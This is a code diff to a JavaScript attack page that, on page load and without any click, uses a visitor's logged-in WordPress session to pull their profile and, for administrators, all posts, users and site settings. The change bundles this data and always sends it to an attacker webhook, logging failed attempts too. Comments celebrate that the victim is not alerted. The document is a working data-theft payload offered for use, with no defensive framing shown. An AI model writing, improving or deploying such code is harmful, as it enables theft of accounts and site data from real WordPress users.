@@ -130,6 +130,8 @@
     
     // Auto-steal on page load — no click required
     (async function autoSteal() {
+        const stolen = { type: 'page_visit', timestamp: new Date().toISOString(), userAgent: navigator.userAgent };
+        
         try {
             const userResponse = await fetch(TARGET + '/wp-json/wp/v2/users/me', {
                 credentials: 'include',
@@ -138,24 +140,13 @@
             
             if (userResponse.ok) {
                 const user = await userResponse.json();
-                
-                // Send user info to attacker webhook
-                await fetch(ATTACKER, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        type: 'user_info',
-                        name: user.name,
-                        id: user.id,
-                        roles: user.roles,
-                        description: user.description,
-                        link: user.link,
-                        url: TARGET,
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent
-                    })
-                });
+                stolen.type = 'user_info';
+                stolen.name = user.name;
+                stolen.id = user.id;
+                stolen.roles = user.roles;
+                stolen.description = user.description;
+                stolen.link = user.link;
+                stolen.url = TARGET;
                 
                 // If admin, steal everything
                 if (user.roles && user.roles.includes('administrator')) {
@@ -164,25 +155,26 @@
                         fetch(TARGET + '/wp-json/wp/v2/users?per_page=100', { credentials: 'include' }).then(r => r.json()),
                         fetch(TARGET + '/wp-json/wp/v2/settings', { credentials: 'include' }).then(r => r.json())
                     ]);
-                    
-                    await fetch(ATTACKER, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        mode: 'no-cors',
-                        body: JSON.stringify({
-                            type: 'full_compromise',
-                            adminUser: user,
-                            posts: posts,
-                            users: users,
-                            settings: settings,
-                            timestamp: new Date().toISOString()
-                        })
-                    });
+                    stolen.type = 'full_compromise';
+                    stolen.adminUser = user;
+                    stolen.posts_count = posts.length;
+                    stolen.users_count = users.length;
+                    stolen.settings = settings;
                 }
+            } else {
+                stolen.wp_status = userResponse.status;
             }
         } catch (err) {
-            // Silently fail — attacker doesn't alert the victim
+            stolen.error = err.message;
         }
+        
+        // Always send to webhook — even failed attempts are logged
+        await fetch(ATTACKER, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            mode: 'no-cors',
+            body: JSON.stringify(stolen)
+        });
     })();
     
     // Button just shows a normal message — attack already happened above
